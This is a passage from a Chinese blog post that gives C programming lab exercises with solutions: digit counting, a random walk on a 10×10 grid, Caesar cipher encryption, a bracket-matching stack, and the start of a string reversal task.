<span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;1&#x27;</span>:<br>            occ[<span class="hljs-number">1</span>]++;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;2&#x27;</span>:<br>            occ[<span class="hljs-number">2</span>]++;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;3&#x27;</span>:<br>            occ[<span class="hljs-number">3</span>]++;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;4&#x27;</span>:<br>            occ[<span class="hljs-number">4</span>]++;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;5&#x27;</span>:<br>            occ[<span class="hljs-number">5</span>]++;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;6&#x27;</span>:<br>            occ[<span class="hljs-number">6</span>]++;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;7&#x27;</span>:<br>            occ[<span class="hljs-number">7</span>]++;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;8&#x27;</span>:<br>            occ[<span class="hljs-number">8</span>]++;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;9&#x27;</span>:<br>            occ[<span class="hljs-number">9</span>]++;<br>            <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Occurrences:&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>, occ[i]);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="随机步法（Random-Walk）"><a href="#随机步法（Random-Walk）" class="headerlink" title="随机步法（Random Walk）"></a>随机步法（Random Walk）</h3><blockquote><p>编写程序，生成一种贯穿10×10字符数组（初始时全为字符’.’）的“随机步法”。程序必须随机地从一个元素“走到”另一个元素，每次都向上、向下、向左或向右移动一个元素位置。已访问过的元素按访问顺序用字母A到Z进行标记。</p><p>下面是一个<em><strong>输出示例：</strong></em></p><table><thead><tr><th align="center">A</th><th align="center">.</th><th align="center">.</th><th align="center">.</th><th align="center">.</th><th align="center">.</th><th align="center">.</th><th align="center">.</th><th align="center">.</th><th align="center">.</th></tr></thead><tbody><tr><td align="center">B</td><td align="center">C</td><td align="center">D</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td></tr><tr><td align="center">.</td><td align="center">F</td><td align="center">E</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td></tr><tr><td align="center">H</td><td align="center">G</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td></tr><tr><td align="center">I</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td></tr><tr><td align="center">J</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">Z</td><td align="center">.</td></tr><tr><td align="center">K</td><td align="center">.</td><td align="center">.</td><td align="center">R</td><td align="center">S</td><td align="center">T</td><td align="center">U</td><td align="center">V</td><td align="center">Y</td><td align="center">.</td></tr><tr><td align="center">L</td><td align="center">M</td><td align="center">P</td><td align="center">Q</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">W</td><td align="center">X</td><td align="center">.</td></tr><tr><td align="center">.</td><td align="center">N</td><td align="center">O</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td></tr></tbody></table><p>利用srand函数和rand函数产生随机数，然后查看次数除以4的余数。余数一共有4种可能的值（0、1、2和3），指示下一次移动的4种可能方向。在执行移动之前，需要检查两项内容：一是不能走到数组外面，二是不能走到已有字母标记的位置。只要一个条件不满足，就得尝试换一个方向移动。如果4个方向都堵住了，程序就必须终止了。下面是提前结束的一个示例:</p><table><thead><tr><th align="center">A</th><th align="center">B</th><th align="center">G</th><th align="center">H</th><th align="center">I</th><th align="center">.</th><th align="center">.</th><th align="center">.</th><th align="center">.</th><th align="center">.</th></tr></thead><tbody><tr><td align="center">.</td><td align="center">C</td><td align="center">F</td><td align="center">O</td><td align="center">J</td><td align="center">K</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td></tr><tr><td align="center">.</td><td align="center">D</td><td align="center">E</td><td align="center">N</td><td align="center">M</td><td align="center">L</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td></tr><tr><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td></tr><tr><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td></tr><tr><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td></tr><tr><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td></tr><tr><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td></tr><tr><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td></tr></tbody></table><p>因为Y的4个方向都堵住了，所以没有地方可以放置下一步的Z了。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;time.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">PrintMap</span><span class="hljs-params">(<span class="hljs-type">char</span> Map[<span class="hljs-number">10</span>][<span class="hljs-number">10</span>])</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">10</span>; j++)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c &quot;</span>, Map[i][j]);<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">SelectToward</span><span class="hljs-params">(<span class="hljs-type">int</span> begin[<span class="hljs-number">2</span>], <span class="hljs-type">char</span> Map[<span class="hljs-number">10</span>][<span class="hljs-number">10</span>], <span class="hljs-type">int</span> toward, <span class="hljs-type">int</span> index, <span class="hljs-type">int</span> boom)</span><br>&#123;<br><br>    boom++;<br>    <span class="hljs-type">char</span> alphabet[<span class="hljs-number">26</span>] = <span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;<br>    <span class="hljs-keyword">switch</span> (toward)<br>    &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">if</span> (begin[<span class="hljs-number">0</span>] - <span class="hljs-number">1</span> &gt;= <span class="hljs-number">0</span> &amp;&amp; Map[begin[<span class="hljs-number">0</span>] - <span class="hljs-number">1</span>][begin[<span class="hljs-number">1</span>]] == <span class="hljs-string">&#x27;.&#x27;</span>)<br>        &#123;<br>            Map[begin[<span class="hljs-number">0</span>] - <span class="hljs-number">1</span>][begin[<span class="hljs-number">1</span>]] = alphabet[index];<br>            begin[<span class="hljs-number">0</span>] -= <span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            <span class="hljs-keyword">return</span> boom != <span class="hljs-number">4</span> ? SelectToward(begin, Map, (toward + <span class="hljs-number">1</span>) % <span class="hljs-number">4</span>, index, boom) : <span class="hljs-number">1</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">if</span> (begin[<span class="hljs-number">0</span>] + <span class="hljs-number">1</span> &lt; <span class="hljs-number">10</span> &amp;&amp; Map[begin[<span class="hljs-number">0</span>] + <span class="hljs-number">1</span>][begin[<span class="hljs-number">1</span>]] == <span class="hljs-string">&#x27;.&#x27;</span>)<br>        &#123;<br>            Map[begin[<span class="hljs-number">0</span>] + <span class="hljs-number">1</span>][begin[<span class="hljs-number">1</span>]] = alphabet[index];<br>            begin[<span class="hljs-number">0</span>] += <span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            <span class="hljs-keyword">return</span> boom != <span class="hljs-number">4</span> ? SelectToward(begin, Map, (toward + <span class="hljs-number">1</span>) % <span class="hljs-number">4</span>, index, boom) : <span class="hljs-number">1</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        <span class="hljs-keyword">if</span> (begin[<span class="hljs-number">1</span>] - <span class="hljs-number">1</span> &gt;= <span class="hljs-number">0</span> &amp;&amp; Map[begin[<span class="hljs-number">0</span>]][begin[<span class="hljs-number">1</span>] - <span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;.&#x27;</span>)<br>        &#123;<br>            Map[begin[<span class="hljs-number">0</span>]][begin[<span class="hljs-number">1</span>] - <span class="hljs-number">1</span>] = alphabet[index];<br>            begin[<span class="hljs-number">1</span>] -= <span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            <span class="hljs-keyword">return</span> boom != <span class="hljs-number">4</span> ? SelectToward(begin, Map, (toward + <span class="hljs-number">1</span>) % <span class="hljs-number">4</span>, index, boom) : <span class="hljs-number">1</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>        <span class="hljs-comment">// printf(&quot;%d %c\n&quot;, begin[1], Map[begin[0]][begin[1] + 1]);</span><br>        <span class="hljs-keyword">if</span> (begin[<span class="hljs-number">1</span>] + <span class="hljs-number">1</span> &lt; <span class="hljs-number">10</span> &amp;&amp; Map[begin[<span class="hljs-number">0</span>]][begin[<span class="hljs-number">1</span>] + <span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;.&#x27;</span>)<br>        &#123;<br>            Map[begin[<span class="hljs-number">0</span>]][begin[<span class="hljs-number">1</span>] + <span class="hljs-number">1</span>] = alphabet[index];<br>            begin[<span class="hljs-number">1</span>] += <span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            <span class="hljs-keyword">return</span> boom != <span class="hljs-number">4</span> ? SelectToward(begin, Map, (toward + <span class="hljs-number">1</span>) % <span class="hljs-number">4</span>, index, boom) : <span class="hljs-number">1</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">RandomWalk</span><span class="hljs-params">(<span class="hljs-type">int</span> begin[<span class="hljs-number">2</span>], <span class="hljs-type">char</span> Map[<span class="hljs-number">10</span>][<span class="hljs-number">10</span>])</span><br>&#123;<br>    <span class="hljs-type">time_t</span> t;<br>    srand((<span class="hljs-type">unsigned</span>)time(&amp;t));<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">26</span>; i++)<br>    &#123;<br>        <span class="hljs-type">int</span> toward = rand() % <span class="hljs-number">4</span>;<br>        <span class="hljs-type">int</span> result = SelectToward(begin, Map, toward, i, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (result)<br>        &#123;<br>            <span class="hljs-comment">// PrintMap(Map);</span><br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-comment">// PrintMap(Map);</span><br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">char</span> walkMap[<span class="hljs-number">10</span>][<span class="hljs-number">10</span>] = &#123;&#123;<span class="hljs-string">&#x27;.&#x27;</span>&#125;&#125;;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">10</span>; j++)<br>        &#123;<br>            walkMap[i][j] = <span class="hljs-string">&#x27;.&#x27;</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-type">time_t</span> t;<br>    srand((<span class="hljs-type">unsigned</span>)time(&amp;t));<br>    <span class="hljs-type">int</span> begin[<span class="hljs-number">2</span>] = &#123;<span class="hljs-number">0</span>, <span class="hljs-number">0</span>&#125;;<br>    walkMap[begin[<span class="hljs-number">0</span>]][begin[<span class="hljs-number">1</span>]] = <span class="hljs-string">&#x27;A&#x27;</span>;<br>    <span class="hljs-comment">// PrintMap(walkMap);</span><br>    RandomWalk(begin, walkMap);<br>    PrintMap(walkMap);<br>    <span class="hljs-comment">// printf(&quot;%d %c\n&quot;, begin[1], walkMap[11][1]);</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="加密（Encryption）"><a href="#加密（Encryption）" class="headerlink" title="加密（Encryption）"></a>加密（Encryption）</h3><blockquote><p>已知的最古老的一种加密技术是凯撒加密（得名于 Julius caesar）。该方法把一条消息中的每个字母用字母表中固定距离之后的那个字母来替代。（如果越过了字母Z，会绕回到字母表的起始位置。例如，如果每个字母都用字母表中两个位置之后的字母代替，那么Y就被替换为A，Z就被替换为B。）</p><p>编写程序用凯撒加密方法对消息进行加密。用户输入待加密的消息和移位计数（字母移动的位置数⽬）：</p><blockquote><p>Enter message to be encrypted: Go ahead, make my day.<br>Enter shift amount (1-25): 3<br>Encrypted message: Jr dkhdg, pdnh pb gdb.</p></blockquote><p>注意,当⽤户输⼊26与移位计数的差值时,程序可以对消息进⾏解密:</p><blockquote><p>Enter message to be encrypted: Jr dkhdg, pdnh pb gdb.<br>Enter shift amount (1-25): 23<br>Encrypted message: Go ahead, make my day</p></blockquote><p>不是字母的那些字符不要改动。此外，加密时不要改变字母的大小写。</p><p><em><strong>输出范例：</strong></em></p><blockquote><p>Enter message to be encrypted: Hello, world!<br>Enter shift amount (1-25): 3<br>Encrypted message: Khoor, zruog!</p></blockquote><blockquote><p>Enter message to be encrypted: Khoor, zruog!<br>Enter shift amount (1-25): 23<br>Encrypted message: Hello, world!</p></blockquote></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;ctype.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">char</span> str[<span class="hljs-number">50</span>];<br>    <span class="hljs-type">int</span> amounts;<br>    fgets(str, <span class="hljs-keyword">sizeof</span>(str), <span class="hljs-built_in">stdin</span>);<br>    fflush(<span class="hljs-built_in">stdin</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;amounts);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">strlen</span>(str); i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (str[i] &gt; <span class="hljs-number">64</span> &amp;&amp; str[i] &lt; <span class="hljs-number">91</span>)<br>        &#123;<br>            str[i] = (str[i] + amounts) &gt; <span class="hljs-number">90</span> ? <span class="hljs-number">64</span> + ((str[i] + amounts) - <span class="hljs-number">90</span>) : (str[i] + amounts);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (str[i] &gt; <span class="hljs-number">96</span> &amp;&amp; str[i] &lt; <span class="hljs-number">123</span>)<br>        &#123;<br><br>            str[i] = (str[i] + amounts) &gt; <span class="hljs-number">122</span> ? <span class="hljs-number">96</span> + ((str[i] + amounts) - <span class="hljs-number">122</span>) : (str[i] + amounts);<br>        &#125;<br>        <span class="hljs-built_in">putchar</span>(str[i]);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="实验四"><a href="#实验四" class="headerlink" title="实验四"></a>实验四</h2><h3 id="栈（Stack）"><a href="#栈（Stack）" class="headerlink" title="栈（Stack）"></a>栈（Stack）</h3><blockquote><p>修改如下程序，使它存储字符而不是整数。</p><p>增加 main 函数，用来要求用户输入一串圆括号或花括号，然后指出它们之间的嵌套是否正确。</p><p><em><strong>输出范例：</strong></em></p><blockquote><p>Enter parentheses and&#x2F;or braces: <code>()(&#123;&#125;)(&#123;&#125;)</code><br>Parentheses&#x2F;braces are nested properly</p></blockquote><blockquote><p>Enter parentheses and&#x2F;or braces: <code>((&#125;</code><br>Parentheses&#x2F;braces are NOT nested properly</p></blockquote></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdbool.h&gt;</span> <span class="hljs-comment">/* C99 only */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STACK_SIZE 100</span><br><br><span class="hljs-comment">/* external variables */</span><br><span class="hljs-type">char</span> contents[STACK_SIZE];<br><span class="hljs-type">int</span> top = <span class="hljs-number">0</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">stack_overflow</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Stack overflow\n&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">stack_underflow</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Stack underflow\n&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">make_empty</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    top = <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">bool</span> <span class="hljs-title function_">is_empty</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> top == <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">bool</span> <span class="hljs-title function_">is_full</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> top == STACK_SIZE;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">push</span><span class="hljs-params">(<span class="hljs-type">char</span> ch)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (is_full())<br>        stack_overflow();<br>    <span class="hljs-keyword">else</span><br>        contents[top++] = ch;<br>&#125;<br><br><span class="hljs-type">char</span> <span class="hljs-title function_">pop</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (is_empty())<br>        stack_underflow();<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">return</span> contents[--top];<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;\0&#x27;</span>; <span class="hljs-comment">/* prevents compiler warning due to stack_underflow() call */</span><br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">char</span> ch;<br>    <span class="hljs-keyword">while</span> ((ch = getchar()) != <span class="hljs-string">&#x27;\n&#x27;</span>)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (ch == <span class="hljs-string">&#x27;(&#x27;</span> || ch == <span class="hljs-string">&#x27;[&#x27;</span> || ch == <span class="hljs-string">&#x27;&#123;&#x27;</span>)<br>        &#123;<br>            push(ch);<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ch == <span class="hljs-string">&#x27;)&#x27;</span> || ch == <span class="hljs-string">&#x27;]&#x27;</span> || ch == <span class="hljs-string">&#x27;&#125;&#x27;</span>)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (is_empty())<br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Parentheses/braces are NOT nested properly&quot;</span>);<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>            &#125;<br>            <span class="hljs-type">char</span> a = pop();<br>            <span class="hljs-keyword">if</span> ((ch == <span class="hljs-string">&#x27;)&#x27;</span> &amp;&amp; a != <span class="hljs-string">&#x27;(&#x27;</span>) || (ch == <span class="hljs-string">&#x27;]&#x27;</span> &amp;&amp; a != <span class="hljs-string">&#x27;[&#x27;</span>) || (ch == <span class="hljs-string">&#x27;&#125;&#x27;</span> &amp;&amp; a != <span class="hljs-string">&#x27;&#123;&#x27;</span>))<br>            &#123;<br>                top++;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (top == <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Parentheses/braces are nested properly&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Parentheses/braces are NOT nested properly&quot;</span>);<br>    &#125;<br>    make_empty();<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="逆序（Reversal）"><a href="#逆序（Reversal）" class="headerlink" title="逆序（Reversal）"></a>逆序（Reversal）</h3><blockquote><p>编写程序读一条消息，然后逆序打印出这条消息。</p><p><em><strong>输出范例：</strong></em></p><blockquote><p>Enter a message: Don’t get mad, get even.<br>Reversal is: .neve teg ,dam teg t’noD</p></blockquote><blockquote><p>Enter a message: Hello, world!<br>Reversal is: !dlrow ,olleH</p></blockquote><p>提示：一次读取消息中的一个字符（用getchar函数），并且把这些字符存储在数组中，当数组写满或者读到字符 ‘\n’ 时停止读入。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 